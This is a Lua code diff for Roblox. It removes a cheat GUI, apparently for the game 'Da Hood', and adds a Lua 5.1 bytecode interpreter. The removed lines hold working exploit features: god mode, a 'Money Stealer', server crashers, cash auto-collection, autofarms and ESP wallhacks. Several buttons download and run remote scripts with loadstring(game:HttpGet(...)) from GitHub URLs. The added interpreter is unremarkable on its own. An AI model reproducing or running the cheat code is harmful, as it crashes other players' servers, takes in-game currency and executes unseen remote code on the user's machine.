-					vel = vel * CFrame.new(-speed, 0, 0)
-				end
-				if control.d then
-					vel = vel * CFrame.new(speed, 0, 0)
-				end
-				seat.Vel.Velocity = (seat.CFrame*vel).p - seat.CFrame.p
-			end
-		end
-		if control.e and speed<100 then
-			speed = speed + 1
-		end
-		if control.q and speed > 0 then
-			speed = speed - 1
-		end
-	end
-
-
-end)
-local invisible = FunstuffPage.AddButton("RPG Control", function()
-
-	game.StarterGui:SetCore("SendNotification", {Title = "D34TH_3V1L [GUI]", Text = "RPG Control executed, press n to speed up and k to slow down", Duration = 20
-
-	})
-
-	-- SETTINGS --
-	local speed = 20
-	local turnSpeed = 3
-	--------------
-
-	local plr = game.Players.LocalPlayer
-	local Mouse = plr:GetMouse()
-	local peniscock
-	local movers
-	local control = {w=false,a=false,s=false,d=false,q=false,e=false}
-
-	game:GetService("RunService").Stepped:connect(function()
-		if plr.PlayerGui:FindFirstChild("MainScreenGui") and plr.PlayerGui.MainScreenGui:FindFirstChild("Bar") and plr.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed") then
-			plr.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
-		else
-			local c = plr.PlayerGui.MainScreenGui.Bar.HP
-			local g = c:Clone()
-			g.Name = "Speed"
-			g.Position = UDim2.new(0.5, 0, 1, -120)
-			g.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
-			g.Picture.Image.Image = "rbxassetid://181035717"
-			g.TextLabel.Text = "Speed"
-			g.Parent = c.Parent
-		end
-		if peniscock and peniscock.Parent ~= nil then
-			setsimulationradius(math.huge^math.huge, math.huge)
-			if plr.Character.Humanoid.Sit ~= true then
-				peniscock = nil
-			end
-			peniscock.CFrame = CFrame.lookAt(peniscock.CFrame.p, Mouse.Hit.p)*CFrame.Angles(math.rad(90), 0, 0)
-		end
-		if control.k and speed > 0 then
-			speed = speed - 1
-		end
-		if control.n and speed < 100 then
-			speed = speed + 1
-		end
-	end)
-
-	Mouse.KeyDown:connect(function(KEY)
-		local key = KEY:lower()
-		if control[key] ~= nil then
-			control[key]=true
-		end
-	end)
-
-	Mouse.KeyUp:connect(function(KEY)
-		local key = KEY:lower()
-		if control[key] ~= nil then
-			control[key]=false
-		end
-	end)
-
-	game.Workspace.Ignored.ChildAdded:connect(function(child)
-		wait()
-		if child.Name == "Launcher" and math.abs((child.Position-plr.Character.HumanoidRootPart.Position).Magnitude)<30 then
-			local old = game.Workspace.CurrentCamera.CameraSubject
-			plr.Character.Humanoid.Sit = true
-			game.Workspace.CurrentCamera.CameraSubject = child
-			peniscock = child
-			child:WaitForChild("BodyVelocity"):Destroy()
-			local e = Instance.new("BodyVelocity", child)
-			while peniscock and peniscock.Parent ~= nil do
-				game.RunService.Stepped:wait()
-				e.Velocity = ((child.CFrame * CFrame.new(0, -speed, 0)).p - child.CFrame.p)
-			end
-			wait(0.5)
-			game.Workspace.CurrentCamera.CameraSubject = old
-		end
-	end)
-end)
-
-local invisible = FunstuffPage.AddButton("Katana (Need knifes)", function()
-
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(1, 0, 0.1)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
-
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, 0, 0.1)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 
-
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(3, 0, 0.1)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 
-
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(4, 0, 0.1)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
-	game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 
-
-
-end)
-
-
--- God Stuff
-
-local FirstLabel = GodPage.AddLabel("GodStuff")
-
-
-local godbutton = GodPage.AddButton("Full-GodMode", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/Full-GodMode-NoUseless'))()
-	game.StarterGui:SetCore("SendNotification", {Title = "HSBC", Text = "Full-GodMode ha sido activado. Armas de fuego y cuerpo a cuerpo no funcionaran. Se puede quitar con Force Reset.", Duration = 40
-	})	
-end)
-
-local godbutton = GodPage.AddButton("[GodBlock] + [GodBullet]", function()
-	local localPlayer = game:GetService('Players').LocalPlayer;
-	local localCharacter = localPlayer.Character;
-	localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
-	for _,v in pairs(localPlayer.Character:GetChildren()) do
-		if v:IsA('MeshPart') or v:IsA('Accessory') then
-			v:Destroy();
-		end;
-	end;
-	local newCharacter = localPlayer.CharacterAdded:Wait();
-	local spoofFolder = Instance.new('Folder');
-	spoofFolder.Name = 'FULLY_LOADED_CHAR';
-	spoofFolder.Parent = newCharacter;
-	newCharacter:WaitForChild('RagdollConstraints'):Destroy();
-	newCharacter:WaitForChild('BodyEffects'):WaitForChild('Defense'):Destroy();
-	newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
-	local spoofValue = Instance.new('BoolValue', newCharacter);
-	spoofValue.Name = 'RagdollConstraints';
-	local defValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
-	defValue.Name = 'Defense';
-	local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
-	armValue.Name = 'Armor';
-
-end)
-
-local godbutton = GodPage.AddButton("GodBlock", function()
-
-	local localPlayer = game:GetService('Players').LocalPlayer;
-	local localCharacter = localPlayer.Character;
-	localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
-	for _,v in pairs(localPlayer.Character:GetChildren()) do
-		if v:IsA('MeshPart') or v:IsA('Accessory') then
-			v:Destroy();
-		end;
-	end;
-	local newCharacter = localPlayer.CharacterAdded:Wait();
-	local spoofFolder = Instance.new('Folder');
-	spoofFolder.Name = 'FULLY_LOADED_CHAR';
-	spoofFolder.Parent = newCharacter;
-	newCharacter:WaitForChild('RagdollConstraints'):Destroy();
-	newCharacter:WaitForChild('BodyEffects'):WaitForChild('Defense'):Destroy();
-	local spoofValue = Instance.new('BoolValue', newCharacter);
-	spoofValue.Name = 'RagdollConstraints';
-	local defValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
-	defValue.Name = 'Defense';
-end)
-
-local godbutton = GodPage.AddButton("GodBullet", function()
-
-	local localPlayer = game:GetService('Players').LocalPlayer;
-	local localCharacter = localPlayer.Character;
-	localCharacter:FindFirstChildWhichIsA('Humanoid').Health = 0;
-	for _,v in pairs(localPlayer.Character:GetChildren()) do
-		if v:IsA('MeshPart') or v:IsA('Accessory') then
-			v:Destroy();
-		end;
-	end;
-	local newCharacter = localPlayer.CharacterAdded:Wait();
-	local spoofFolder = Instance.new('Folder');
-	spoofFolder.Name = 'FULLY_LOADED_CHAR';
-	spoofFolder.Parent = newCharacter;
-	newCharacter:WaitForChild('RagdollConstraints'):Destroy();
-	newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
-	local spoofValue = Instance.new('BoolValue', newCharacter);
-	spoofValue.Name = 'RagdollConstraints';
-	local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
-	armValue.Name = 'Armor';
-
-
-end)
-
-
-
-
-
-
--- Money stuff
-
-local FirstLabel = CashPage.AddLabel("MoneyStuff")
-local FirstButton = CashPage.AddButton("Money Stealer", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/DaHoodMoneyStealer'))()
-end)
-
-local FirstButton = CashPage.AddButton("Crash for low PC [GS21]", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-TB-Crash/main/Swagmode%20crash%20modified%20(better%20FPS)%20crash"))()
-end)
-local FirstButton = CashPage.AddButton("Crash [SwagMode]", function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-end)
-local FirstButton = CashPage.AddButton("Cash dropper [Raycodex]", function()
-	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
-end)
-local FirstToggle = CashPage.AddToggle("Cash Aura", false, function(CashAura)
-	if CashAura == true then 
-		game:GetService('RunService'):BindToRenderStep("Cash Aura", 0 , function()
-			wait()
-			for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
-				if v:IsA('Part') then
-					if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
-						fireclickdetector(v:FindFirstChild('ClickDetector'))
-					end
-				end
-			end
-
-		end)
+		return total
 	else
-
-		game:GetService('RunService'):UnbindFromRenderStep("Cash Aura")
-
+		local pn = 2^(n-1)
+		return (input % (pn + pn) >= pn) and 1 or 0
 	end
-end)
+end
 
--- Auto Farm
+local function decode_bytecode(bytecode)
+	local index = 1
+	local big_endian = false
+    local int_size;
+    local size_t;
 
-local autofarmbutton = CashPage.AddButton("Muscle Autofarm", function()
-	while true do
-		wait()
-		if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
-			wait()
-			local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
-			if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
-				wait(.2)
-				fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
+    -- Actual binary decoding functions. Dependant on the bytecode.
+    local get_int, get_size_t;
+
+	-- Binary decoding helper functions
+	local get_int8, get_int32, get_int64, get_float64, get_string;
+	do
+		function get_int8()
+			local a = bytecode:byte(index, index);
+			index = index + 1
+			return a
+		end
+		function get_int32()
+            local a, b, c, d = bytecode:byte(index, index + 3);
+            index = index + 4;
+            return d*16777216 + c*65536 + b*256 + a
+        end
+        function get_int64()
+            local a = get_int32();
+            local b = get_int32();
+            return b*4294967296 + a;
+        end
+		function get_float64()
+			local a = get_int32()
+			local b = get_int32()
+			return (-2*get_bits(b, 32)+1)*(2^(get_bits(b, 21, 31)-1023))*
+			       ((get_bits(b, 1, 20)*(2^32) + a)/(2^52)+1)
+		end
+		function get_string(len)
+			local str;
+            if len then
+	            str = bytecode:sub(index, index + len - 1);
+	            index = index + len;
+            else
+                len = get_size_t();
+	            if len == 0 then return; end
+	            str = bytecode:sub(index, index + len - 1);
+	            index = index + len;
+            end
+            return str;
+        end
+	end
+
+	local function decode_chunk()
+		local chunk;
+		local instructions = {};
+		local constants    = {};
+		local prototypes   = {};
+		local debug = {
+			lines = {};
+		};
+
+		chunk = {
+			instructions = instructions;
+			constants    = constants;
+			prototypes   = prototypes;
+			debug = debug;
+		};
+
+		local num;
+
+		chunk.name       = get_string();-- Function name
+		chunk.first_line = get_int();	-- First line
+		chunk.last_line  = get_int();	-- Last  line
+
+        if chunk.name then chunk.name = chunk.name:sub(1, -2); end
+		
+		chunk.upvalues  = get_int8();
+		chunk.arguments = get_int8();
+		chunk.varg      = get_int8();
+		chunk.stack     = get_int8();
+
+        -- TODO: realign lists to 1
+		-- Decode instructions
+		do
+			num = get_int();
+			for i = 1, num do
+				local instruction = {
+					-- opcode = opcode number;
+					-- type   = [ABC, ABx, AsBx]
+					-- A, B, C, Bx, or sBx depending on type
+				};
+
+				local data   = get_int32();
+				local opcode = get_bits(data, 1, 6);
+				local type   = lua_opcode_types[opcode + 1];
+
+				instruction.opcode = opcode;
+				instruction.type   = type;
+				
+				instruction.A = get_bits(data, 7, 14);
+				if type == "ABC" then
+					instruction.B = get_bits(data, 24, 32);
+					instruction.C = get_bits(data, 15, 23);
+				elseif type == "ABx" then
+					instruction.Bx = get_bits(data, 15, 32);
+				elseif type == "AsBx" then
+					instruction.sBx = get_bits(data, 15, 32) - 131071;
+				end
+
+				instructions[i] = instruction;
 			end
 		end
-		if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
-			tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
-			tool.Parent = game.Players.LocalPlayer.Character
+
+		-- Decode constants
+		do
+			num = get_int();
+			for i = 1, num do
+				local constant = {
+					-- type = constant type;
+					-- data = constant data;
+				};
+				local type = get_int8();
+				constant.type = type;
+
+				if type == 1 then
+					constant.data = (get_int8() ~= 0);
+				elseif type == 3 then
+					constant.data = get_float64();
+				elseif type == 4 then
+					constant.data = get_string():sub(1, -2);
+				end
+
+				constants[i-1] = constant;
+			end
 		end
-		game:GetService("VirtualUser"):ClickButton1(Vector2.new())
-		local d = Vector3.new(-1006.99, -51.1542, -1014.33)
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
+
+		-- Decode Prototypes
+		do
+			num = get_int();
+			for i = 1, num do
+				prototypes[i-1] = decode_chunk();
+			end
+		end
+
+		-- Decode debug info
+        -- Not all of which is used yet.
+		do
+			-- line numbers
+			local data = debug.lines
+			num = get_int();
+			for i = 1, num do
+				data[i] = get_int32();
+			end
+
+			-- locals
+			num = get_int();
+			for i = 1, num do
+				get_string():sub(1, -2);	-- local name
+				get_int32();	-- local start PC
+				get_int32();	-- local end   PC
+			end
+
+			-- upvalues
+			num = get_int();
+			for i = 1, num do
+				get_string();	-- upvalue name
+			end
+		end
+
+		return chunk;
 	end
-end)
-local autofarmbutton = CashPage.AddButton("P90-Autofarm", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/P90%20Autofarm"))()
-end)
-local autofarmbutton = CashPage.AddButton("Auto-Box", function()
-	while true do
-		wait()
-		if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
-			local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
-			tool.Parent = game.Players.LocalPlayer.Character
-		end
-		for V, W in pairs(game.Workspace.MAP.Map.ArenaBOX:GetChildren()) do
-			wait()
-			warn(W)
-			if W.Name == "PunchingBagInGame" then
-				wait()
-				posMx = W:FindFirstChild("pretty ransom").Position - Vector3.new(0, 0, 0)
-				poscMx = W:FindFirstChild("pretty ransom").CFrame - Vector3.new(3, 0, 0)
-				ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
-				while true do
-					if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
-						local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
-						tool.Parent = game.Players.LocalPlayer.Character
-					end
-					ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
-					wait(.5)
-					game:GetService("VirtualUser"):ClickButton1(Vector2.new())
+
+	-- Verify bytecode header
+	do
+		assert(get_string(4) == "\27Lua", "Lua bytecode expected.");
+		assert(get_int8() == 0x51, "Only Lua 5.1 is supported.");
+		get_int8(); 	-- Oficial bytecode
+		big_endian = (get_int8() == 0);
+        int_size = get_int8();
+        size_t   = get_int8();
+
+        if int_size == 4 then
+            get_int = get_int32;
+        elseif int_size == 8 then
+            get_int = get_int64;
+        else
+	        -- TODO: refactor errors into table
+            error("Unsupported bytecode target platform");
+        end
+
+        if size_t == 4 then
+            get_size_t = get_int32;
+        elseif size_t == 8 then
+            get_size_t = get_int64;
+        else
+            error("Unsupported bytecode target platform");
+        end
+
+        assert(get_string(3) == "\4\8\0",
+	           "Unsupported bytecode target platform");
+	end
+
+	return decode_chunk();
+end
+
+local function handle_return(...)
+	local c = select("#", ...)
+	local t = {...}
+	return c, t
+end
+
+local function create_wrapper(cache, upvalues)
+	local instructions = cache.instructions;
+	local constants    = cache.constants;
+	local prototypes   = cache.prototypes;
+	
+	local stack, top
+	local environment
+	local IP = 1;	-- instruction pointer
+	local vararg, vararg_size 
+
+	local opcode_funcs = {
+		[0]  = function(instruction)	-- MOVE
+			stack[instruction.A] = stack[instruction.B];
+		end,
+		[1]  = function(instruction)	-- LOADK
+			stack[instruction.A] = constants[instruction.Bx].data;
+		end,
+		[2]  = function(instruction)	-- LOADBOOL
+			stack[instruction.A] = instruction.B ~= 0
+			if instruction.C ~= 0 then
+				IP = IP + 1
+			end
+		end,
+		[3]  = function(instruction)	-- LOADNIL
+			local stack = stack
+			for i = instruction.A, instruction.B do
+				stack[i] = nil
+			end
+		end,
+		[4] = function(instruction)		-- GETUPVAL
+			stack[instruction.A] = upvalues[instruction.B]
+		end,
+		[5]  = function(instruction)	-- GETGLOBAL
+			local key = constants[instruction.Bx].data;
+			stack[instruction.A] = environment[key];
+		end,
+		[6]  = function(instruction)	-- GETTABLE
+			local C = instruction.C
+			local stack = stack
+			C = C > 255 and constants[C-256].data or stack[C]
+			stack[instruction.A] = stack[instruction.B][C];
+		end,
+		[7]  = function(instruction)	-- SETGLOBAL
+			local key = constants[instruction.Bx].data;
+			environment[key] = stack[instruction.A];
+		end,
+		[8] = function (instruction)	-- SETUPVAL
+			upvalues[instruction.B] = stack[instruction.A]
+		end,
+		[9] = function (instruction)	-- SETTABLE
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A][B] = C
+		end,
+		[10] = function (instruction)	-- NEWTABLE
+			stack[instruction.A] = {}
+		end,
+		[11] = function (instruction)	-- SELF
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack = stack
+			
+			B = stack[B]
+			C = C > 255 and constants[C-256].data or stack[C]
+			
+			stack[A+1] = B
+			stack[A]   = B[C]
+		end,
+		[12] = function(instruction)	-- ADD
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B+C;
+		end,
+		[13] = function(instruction)	-- SUB
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B - C;	
+		end,
+		[14] = function(instruction)	-- MUL
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B * C;
+		end,
+		[15] = function(instruction)	--DIV
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B / C;
+		end,
+		[16] = function(instruction) 	-- MOD
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B % C;		
+		end,
+		[17] = function(instruction)	-- POW
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack, constants = stack, constants;
+			
+			B = B > 255 and constants[B-256].data or stack[B];
+			C = C > 255 and constants[C-256].data or stack[C];
+			
+			stack[instruction.A] = B ^ C;		
+		end,
+		[18] = function(instruction)	-- UNM
+			stack[instruction.A] = -stack[instruction.B]
+		end,
+		[19] = function(instruction)	-- NOT
+			stack[instruction.A] = not stack[instruction.B]
+		end,
+		[20] = function(instruction)	-- LEN
+			stack[instruction.A] = #stack[instruction.B]
+		end,
+		[21] = function(instruction)	-- CONCAT
+			local B = instruction.B
+			local result = stack[B]
+			for i = B+1, instruction.C do
+				result = result .. stack[i] 
+			end
+			stack[instruction.A] = result
+		end,
+		[22] = function(instruction)	-- JUMP
+			IP = IP + instruction.sBx
+		end,
+		[23] = function(instruction)	-- EQ
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack, constants = stack, constants
+			
+			A = A ~= 0
+			B = B > 255 and constants[B-256].data or stack[B]
+			C = C > 255 and constants[C-256].data or stack[C]
+			if (B == C) ~= A then
+				IP = IP + 1
+			end
+		end,
+		[24] = function(instruction)	-- LT
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack, constants = stack, constants
+			
+			A = A ~= 0
+			B = B > 255 and constants[B-256].data or stack[B]
+			C = C > 255 and constants[C-256].data or stack[C]
+			if (B < C) ~= A then
+				IP = IP + 1
+			end		
+		end,
+		[25] = function(instruction)	-- LT
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack, constants = stack, constants
+			
+			A = A ~= 0
+			B = B > 255 and constants[B-256].data or stack[B]
+			C = C > 255 and constants[C-256].data or stack[C]
+			if (B <= C) ~= A then
+				IP = IP + 1
+			end		
+		end,
+		[26] = function(instruction)	-- TEST
+			if (not not stack[instruction.A]) == (instruction.C == 0) then
+				IP = IP + 1
+			end
+		end,
+		[27] = function(instruction)	-- TESTSET
+			local stack = stack
+			local B = stack[instruction.B]
+			if (not not B) == (instruction.C == 0) then
+				IP = IP + 1
+			else
+				stack[instruction.A] = B
+			end
+		end,
+		[28] = function(instruction)	-- CALL
+			local A = instruction.A;
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack = stack;
+			local args, results;
+			local limit, loop
+			
+			args = {};
+			if B ~= 1 then
+				if B ~= 0 then
+					limit = A+B-1;
+				else
+					limit = top
+				end
+				
+				loop = 0
+				for i = A+1, limit do
+					loop = loop + 1
+					args[loop] = stack[i];
+				end
+				
+				limit, results = handle_return(stack[A](unpack(args, 1, limit-A)))
+			else
+				limit, results = handle_return(stack[A]())
+			end
+			
+			top = A - 1
+		
+			if C ~= 1 then
+				if C ~= 0 then
+					limit = A+C-2;
+				else
+					limit = limit+A
+				end
+				
+				loop = 0;
+				for i = A, limit do
+					loop = loop + 1;
+					stack[i] = results[loop];
 				end
 			end
+		end,
+		[29] = function (instruction)	-- TAILCALL
+			local A = instruction.A;
+			local B = instruction.B;
+			local C = instruction.C;
+			local stack = stack;
+			local args, results;
+			local top, limit, loop = top
+			
+			args = {};
+			if B ~= 1 then
+				if B ~= 0 then
+					limit = A+B-1;
+				else
+					limit = top
+				end
+				
+				loop = 0
+				for i = A+1, limit do
+					loop = loop + 1
+					args[#args+1] = stack[i];
+				end
+				
+				results = {stack[A](unpack(args, 1, limit-A))};
+			else
+				results = {stack[A]()};
+			end
+			
+			return true, results
+		end,
+		[30] = function(instruction) -- RETURN
+			--TODO: CLOSE
+			local A = instruction.A;
+			local B = instruction.B;
+			local stack = stack;
+			local limit;
+			local loop, output;
+						
+			if B == 1 then
+				return true;
+			end
+			if B == 0 then
+				limit = top
+			else
+				limit = A + B - 2;
+			end
+			
+			output = {};
+			local loop = 0
+			for i = A, limit do
+				loop = loop + 1
+				output[loop] = stack[i];
+			end
+			return true, output;
+		end,
+		[31] = function(instruction)	-- FORLOOP
+			local A = instruction.A
+			local stack = stack
+			
+			local step = stack[A+2]
+			local index = stack[A] + step 
+			stack[A] = index
+			
+			if step > 0 then
+				if index <= stack[A+1] then
+					IP = IP + instruction.sBx
+					stack[A+3] = index
+				end
+			else
+				if index >= stack[A+1] then
+					IP = IP + instruction.sBx
+					stack[A+3] = index
+				end
+			end
+		end,
+		[32] = function(instruction)	-- FORPREP
+			local A = instruction.A
+			local stack = stack
+			
+			stack[A] = stack[A] - stack[A+2]
+			IP = IP + instruction.sBx 
+		end,
+		[33] = function(instruction)	-- TFORLOOP
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack = stack
+			
+			local offset = A+2
+			local result = {stack[A](stack[A+1], stack[A+2])}
+			for i = 1, C do
+				stack[offset+i] = result[i]
+			end
+			
+			if stack[A+3] ~= nil then
+				stack[A+2] = stack[A+3]
+			else
+				IP = IP + 1
+			end
+		end,
+		[34] = function(instruction)	-- SETLIST
+			local A = instruction.A
+			local B = instruction.B
+			local C = instruction.C
+			local stack = stack
+
+			if C == 0 then
+				error("NYI: extended SETLIST")
+			else
+				local offset = (C - 1) * 50
+				local t = stack[A]
+				
+				if B == 0 then
+					B = top
+				end
+				for i = 1, B do
+					t[offset+i] = stack[A+i]	
+				end				
+			end
+		end,
+		[35] = function(instruction)	-- CLOSE
+			--io.stderr:write("NYI: CLOSE")
+			--io.stderr:flush()
+		end,
+		[36] = function(instruction)	-- CLOSURE
+			local proto = prototypes[instruction.Bx]
+			local instructions = instructions
+			local stack = stack
+			
+			local indices = {}
+			local new_upvals = setmetatable({},
+				{
+					__index = function(t, k)
+						local upval = indices[k]
+						return upval.segment[upval.offset]
+					end,
+					__newindex = function(t, k, v)
+						local upval = indices[k]
+						upval.segment[upval.offset] = v
+					end
+				}
+			)
+			for i = 1, proto.upvalues do
+				local movement = instructions[IP]
+				if movement.opcode == 0 then -- MOVE
+					indices[i-1] = {segment = stack, offset = movement.B}
+				elseif instructions[IP].opcode == 4 then -- GETUPVAL
+					indices[i-1] = {segment = upvalues, offset = movement.B}
+				end
+				IP = IP + 1
+			end
+			
+			local _, func = create_wrapper(proto, new_upvals)
+			stack[instruction.A] = func
+		end,
+		[37] = function(instruction)	-- VARARG
+			local A = instruction.A
+			local B = instruction.B
+			local stack, vararg = stack, vararg
+			
+			for i = A, A + (B > 0 and B - 1 or vararg_size) do
+				stack[i] = vararg[i - A]
+			end
+		end,
+	}
+	
+	local function handle_error(b)
+		local name = cache.name;
+		local line = cache.debug.lines[IP];
+		local err = (b:match("^.+:(.+)") or b)
+		local output = "Error: ";
+		
+		if name then
+			output = name
+		end
+		
+		if line then 
+			output = output.." - Line: "..line
+		end
+		
+		if b and type(b) == "string" then
+			output = output.." - Error: ".. err
+		end
+		
+		if customErrorHandler then
+			--coroutine.resume(customErrorHandler,tostring(line)..":"..tostring(err))
+			customErrorHandler(tostring(line)..":"..tostring(err))
+		else
+			error(tostring(line)..":"..tostring(err),3)
 		end
 	end
-end)
-
--- Esto va al final
-
-local FirstLabel = WallPage.AddLabel("ESP [Thank You Dimag X :D]")
-local kiriot22ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pvpahh/dimagx/main/laodlol"))()
-kiriot22ESP:Toggle(true)
-kiriot22ESP.Boxes = false
-kiriot22ESP.Tracers = false
-kiriot22ESP.Names = false
-local FirstToggle = WallPage.AddToggle("BoxESP", false, function(t)
-	if t == true then
-		kiriot22ESP.Boxes = true
-	elseif t == false then
-		kiriot22ESP.Boxes = false
+	
+	local function loop()
+		local instructions = instructions
+		local instruction, a, b, ran
+		
+		while true do
+			instruction = instructions[IP];
+			--//print("IP: "..tostring(IP))
+			--//print("INSTUCT: "..tostring(instruction))
+			--//print("OPCODE: "..instruction.opcode)
+			IP = IP + 1
+			ran, a, b = pcall(function() return opcode_funcs[instruction.opcode](instruction); end);
+			if not ran then
+				handle_error(a);
+				break;
+			elseif a then
+				return b;
+			end
+		end
 	end
-end)
-local FirstToggle = WallPage.AddToggle("Name-ESP", false, function(t)
-	if t == true then
-		kiriot22ESP.Names = true
-	elseif t == false then
-		kiriot22ESP.Names = false
+
+	local debugging = {
+		get_stack = function()
+			return stack;
+		end;
+		get_IP = function()
+			return IP;
+		end
+	};
+
+	local function func(...)
+		local local_stack = {};
+		local ghost_stack = {};
+
+		top = -1
+		stack = setmetatable(local_stack, {
+			__index = ghost_stack;
+			__newindex = function(t, k, v)
+				if k > top and v then
+					top = k
+				end
+				ghost_stack[k] = v
+			end;
+		})
+		local args = {...};	
+		vararg = {}
+		vararg_size = select("#", ...) - 1
+		for i = 0, vararg_size do
+			local_stack[i] = args[i+1];
+			vararg[i] = args[i+1]
+		end
+		
+		environment = newEnv or getfenv();
+		IP = 1;
+		local thread = coroutine.create(loop)
+		local a, b = coroutine.resume(thread)
+
+		if a then
+			if b then
+				return unpack(b);
+			end
+			return;
+		else
+			if advanced_debug then
+				--TODO advanced debugging
+			else
+				handle_error(b)
+			end
+		end 
 	end
-end)
+	
+	return debugging, func;
+end
 
--- Animations
+load_bytecode = function(bytecode, env, customHandler)
+	newEnv = env or getfenv(2)
+	customErrorHandler = customHandler
+	local cache = decode_bytecode(bytecode);
+	local _, func = create_wrapper(cache);
+	return func;
+end;
 
-local AnimationsButton = AnimationsPage.AddButton("Pro Animation", function()
-	local Animate = game.Players.LocalPlayer.Character.Animate
